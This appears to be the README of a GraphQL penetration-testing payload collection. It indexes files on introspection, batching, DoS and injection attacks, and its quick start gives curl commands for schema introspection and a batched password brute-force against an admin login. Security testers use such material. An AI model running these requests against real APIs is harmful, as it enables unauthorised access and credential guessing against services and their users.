# GraphQL Security Payloads

> Covers introspection, batching, DoS, and injection attacks on GraphQL APIs

## Files

| File | Description |
|------|-------------|
| [`introspection_queries.md`](introspection_queries.md) | Full introspection, bypass techniques, batching, nested DoS, field enumeration |
| [`graphql_injection.md`](graphql_injection.md) | SQLi, NoSQLi, SSRF, OS command injection, stored XSS via GraphQL |

## Quick Start

```bash
# Full introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name kind}}}"}'

# Batch brute-force
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(email:\"admin@t.com\",password:\"p1\"){token}}"},{"query":"mutation{login(email:\"admin@t.com\",password:\"p2\"){token}}"}]'
```
